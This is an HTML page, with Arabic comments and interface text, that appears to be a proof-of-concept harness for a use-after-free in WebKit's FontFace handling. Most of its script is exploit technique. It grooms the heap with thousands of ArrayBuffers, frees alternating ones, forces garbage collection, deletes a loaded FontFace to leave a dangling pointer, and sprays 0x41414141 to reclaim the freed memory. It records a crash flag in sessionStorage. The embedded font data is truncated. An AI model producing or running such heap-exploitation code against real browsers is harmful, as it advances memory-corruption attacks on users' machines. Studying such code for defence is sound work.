<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WebKit Stable UAF Harness</title>
    <style>
        body { background-color: #0b0e14; color: #00ff99; font-family: 'Courier New', monospace; padding: 40px; text-align: center; }
        .wrapper { border: 2px solid #00ff99; padding: 30px; display: inline-block; width: 80%; max-width: 750px; box-shadow: 0 0 25px rgba(0,255,153,0.2); border-radius: 16px; background: #111622; }
        #status-display { margin: 20px 0; padding: 15px; font-size: 28px; font-weight: bold; border: 1px solid #333; min-height: 40px; background: #0b0e14; }
        .exists { color: #ff3333; text-shadow: 0 0 12px #ff3333; }
        .patched { color: #00ff99; text-shadow: 0 0 12px #00ff99; }
        .testing { color: #ffcc00; }
        button { background: transparent; color: #00ff99; border: 2px solid #00ff99; padding: 12px 35px; font-size: 18px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        button:hover { background: #00ff99; color: #0b0e14; }
        #log-area { text-align: left; background: #05070a; padding: 15px; height: 150px; overflow-y: auto; color: #888; font-size: 13px; border: 1px solid #222; border-radius: 6px; }
    </style>
</head>
<body>

<div class="wrapper">
    <h2>WebKit UAF Stabilized Bench</h2>
    <p>فحص إدارة الذاكرة وتثبيت حالة السباق دون تحديث تلقائي للشاشة</p>
    
    <button onclick="executePoC()">إطلاق الفحص الحقيقي</button>
    
    <div id="status-display">في انتظار التشغيل...</div>
    <div id="log-area">[*] بانتظام ضغط الزر لبدء هندسة الذاكرة...</div>
</div>

<script>
    let memoryGroom = [];
    let memoryHoles = [];
    let heavySpray = [];

    function writeLog(text) {
        document.getElementById('log-area').innerHTML += `<div>${text}</div>`;
        const logArea = document.getElementById('log-area');
        logArea.scrollTop = logArea.scrollHeight;
    }

    // الفحص الصامت عند فتح الصفحة: هل انهار المتصفح في المرة السابقة؟
    window.onload = function() {
        if (sessionStorage.getItem('crash_check') === 'active') {
            document.getElementById('status-display').innerHTML = "<span class='exists'>UAF EXISTS</span>";
            writeLog("[!] تنبيه: تم رصد انهيار حاد (Hard Crash) في الجلسة السابقة للـ bmalloc!");
            sessionStorage.removeItem('crash_check');
        }
    }

    function pumpGarbageCollector() {
        writeLog("[*] تحفيز الـ GC عبر الضغط الذاكري المكثف...");
        for (let i = 0; i < 8; i++) {
            let tempAlloc = [];
            for (let j = 0; j < 25000; j++) {
                tempAlloc.push(new Uint32Array(64));
            }
            tempAlloc = null;
        }
    }

    async function executePoC() {
        const display = document.getElementById('status-display');
        display.innerHTML = "<span class='testing'>جاري الفحص وهندسة الذاكرة...</span>";
        writeLog("=== بدء المحاولة ===");

        // وضع علامة الكراش: لو كراش المتصفح وقفل التبويب أو رستر، بتثبت هالعلامة للتشغيل الجاي
        sessionStorage.setItem('crash_check', 'active');

        try {
            // 1. هندسة وتطهير الـ Heap
            writeLog("[1] ملء الفجوات العشوائية في الذاكرة...");
            for (let i = 0; i < 5000; i++) {
                memoryGroom.push(new ArrayBuffer(64));
            }

            // 2. حفر خنادق متتالية تكتيكية
            writeLog("[2] تخصيص خنادق متسلسلة وتحرير نصفها...");
            for (let i = 0; i < 25000; i++) {
                memoryHoles.push(new ArrayBuffer(64));
            }
            for (let i = 0; i < memoryHoles.length; i += 2) {
                memoryHoles[i] = null; // صنع الفراغات
            }
            pumpGarbageCollector();

            // 3. حجز كائن الـ FontFace الحقيقي داخل الخندق
            writeLog("[3] تخصيص كائن الخط المستهدف...");
            let testFont = new FontFace('TargetFont', 'url(data:font/woff2;base64,d09GMgABAAAAAAJkAA4...=)');
            document.fonts.add(testFont);
            testFont.load();

            // 4. التحرير لإنتاج المؤشر المتدلي
            writeLog("[4] حذف كائن الخط وتفريغ المؤشرات...");
            document.fonts.delete(testFont);
            testFont = null;
            pumpGarbageCollector();

            // 5. الرش العنيف والموسع لاحتلال المساحة المحررة
            writeLog("[5] بدء الاحتلال الفوري عبر Heavy Heap Spray...");
            for (let i = 0; i < 40000; i++) {
                let view = new DataView(new ArrayBuffer(64));
                for (let j = 0; j < 64; j += 4) {
                    view.setUint32(j, 0x41414141, true); // بايتات التدمير والتلوث
                }
                heavySpray.push(view);
            }

            // إذا وصلنا هنا بدون كراش، يعني المتصفح مستقر وتجاوز الفخ بأمان
            // نقوم بإلغاء علامة الكراش فوراً لأن العملية تمت بنجاح نظيف
            sessionStorage.removeItem('crash_check');
            
            display.innerHTML = "<span class='patched'>UAF PATCHED / SAFE</span>";
            writeLog("[✓] انتهت العملية واستقر المتصفح تماماً بدون أي انهيار في العناوين.");

            // تنظيف الكاشات للاستعداد للمحاولة القادمة دون تضخيم الرام
            memoryGroom = [];
            memoryHoles = [];
            heavySpray = [];

        } catch (e) {
            sessionStorage.removeItem('crash_check');
            display.innerHTML = "<span class='patched'>UAF PATCHED / SAFE</span>";
            writeLog("[*] تم اعتراض العملية بأمان أو المتصفح مرقع: " + e.message);
        }
    }
</script>

</body>
</html>
